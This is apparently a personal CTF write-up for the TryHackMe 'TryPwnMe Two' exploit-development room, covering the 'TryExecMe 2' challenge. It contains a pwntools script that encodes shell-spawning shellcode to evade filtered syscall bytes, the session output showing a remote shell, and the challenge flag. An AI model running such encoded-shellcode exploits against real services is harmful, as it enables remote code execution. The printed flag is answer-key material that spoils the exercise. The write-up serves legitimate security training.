<h1 align="center">TryPwnMe Two</h1>
<p align="center">2025, August 17<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>468</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Test yourself with our Exploit Development challenges and practice the foundational techniques of binary exploitation in this second part of the TryPwnMe saga</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/232a764e-3ae1-469a-9b97-4b6595601e77"><br>
Access this CTF <a href="https://tryhackme.com/room/trypwnmetwo">here </a>.<br>
<img width="1200px" src=""></p>


<br>

<h2>Task 1 . Introduction</h2>
<p><em>I heard that you wanted to practice Exploit Development. Well, I'm the Blizzard Bear, the master-pwner of the Frosty Five team, and I have some challenges for you to practice. Can you beat me and crack your way into this room? </em></p>

<p>The below tasks contain intermediate Exploit Development challenges. If you are already familiar with concepts like Buffer Overflows, Assembly, and Exploit Development in general, these challenges may fall into the medium category in terms of difficulty. On the other hand, it can be a bit more challenging if you are not familiar with these concepts. In case you don't know where to start, you can begin by getting familiar with tools and concepts like: 

- GDB or any Linux debugger of your choice<br>
- Pwntools<br>
- Basics of Assembly<br>
- Buffer Overflows<br><br>

It is also recommended, but not required, to first solve TryPwnMe One. These challenges are good for practicing the basics of Exploit Development and are good if you want to learn Binary Hacking. </p>

<h3>Instructions</h3>
<p>Start the challenge by clicking on the Start Machine button at the top of this task. Follow the instructions for each task and work with the associated file, remote IP, and port number. You must develop an exploit and read the content of flag.txt on the remote service.<br><br>

The files needed to complete this challenge are accessible from the AttackBox in the /root/Rooms/TryPwnMeTwo/ directory. If you prefer to work on your local VM, download the necessary files in the next task.<br><br>

<strong>The challenges in this room are running  Ubuntu, so there will be stack alignment issues. Make sure to add a ret gadget to solve it if needed.</strong><br><br>

Have some pwn (fun)!</p>

<p><em>Answer the question below</em></p>

<p>1.1. Click to complete the task<br>
<code>No answer needed</code></p>

<br>
<h3>Task 2 . Materials</h3>
<p> [ Download Task Files ] </p>

<p>The files needed to complete this challenge are accessible from the AttackBox in the /root/Rooms/TryPwnMeTwo/ directory. If you prefer to work on your local machine, download the files directly via the Download Task Files link on this task. These files are the ones that you need to exploit during the next tasks. The md5 hash of the zip file is d69d965f7c372efb35c891ee094cbdce, in case you need to check its integrity after downloading it.</p>

<p><em>Answer the question below</em></p>

<p>2.1. I´ve donwloaded the files!<br>
<code>No answer needed</code></p>

<br>

```bash
:~/Rooms/TryPwnMeTwo# ls -lah
total 9.9M
drwxr-xr-x  6 root root 4.0K Jan 30  2025 .
drwxr-xr-x 41 root root 4.0K May 23 09:40 ..
-rw-r--r--  1 root root 9.9M Jan 30  2025 materials-trypwnmetwo-1736914672618.zip
drwxr-xr-x  2 root root 4.0K Jan 30  2025 NotSpecified2
drwxr-xr-x  2 root root 4.0K Jan 30  2025 SlowServer
drwxr-xr-x  2 root root 4.0K Jan 30  2025 TryaNote
drwxr-xr-x  2 root root 4.0K Jan 30  2025 TryExecMe2
```

<br>
<h3>Task 3 . TryExecMe 2</h3>
<p><em></em>OH! So what if you can execute whatever you want! Do you think you can get a shell? ! Brrrrrr!</p>em><br>

Try to get the flag on the remote server using the following IP and port.

xx.xxx.xx.xx 5002</p>

<p><em>Answer the question below</em></p>

<p>3.1. What is the content of the file flag.txt on the target?<br>
<code>THM{TryExecMe-reveng3-with-no-s1sc4lls-nic3}</code></p>

<br>

```bash
:~/Rooms/TryPwnMeTwo/TryExecMe2# file tryexecme2
tryexecme2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6b8498952c23c338096222278ce22a73b927363c, for GNU/Linux 3.2.0, not stripped
```


<img width="1265" height="687" alt="image" src="https://github.com/user-attachments/assets/cee70639-5c3a-4983-86f3-0a56f80501ac" />


```bash
:~/Rooms/TryPwnMeTwo/TryExecMe2# cat script.py
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

r = remote("10.201.77.76", 5002)

# Generate shellcode to spawn a shell
shellcode = asm(shellcraft.sh())

# Encode the shellcode to avoid 0x0f and 0xcd
encoded_shellcode = encode(shellcode, avoid=b"\x0f\xcd")

r.recvuntil(b"Give me your spell, and I will execute it: \n")
r.sendline(encoded_shellcode)
r.interactive("$ ")





:~/Rooms/TryPwnMeTwo/TryExecMe2# python3 script.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.8/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.13.1 --> 4.14.1).
    Update with: $ pip install -U pwntools

Executing Spell...

$ id
uid=1000 gid=1000 groups=1000
$ ls
flag.txt
run
$ cat flag.txt
THM{TryExecMe-reveng3-with-no-s1sc4lls-nic3}$  



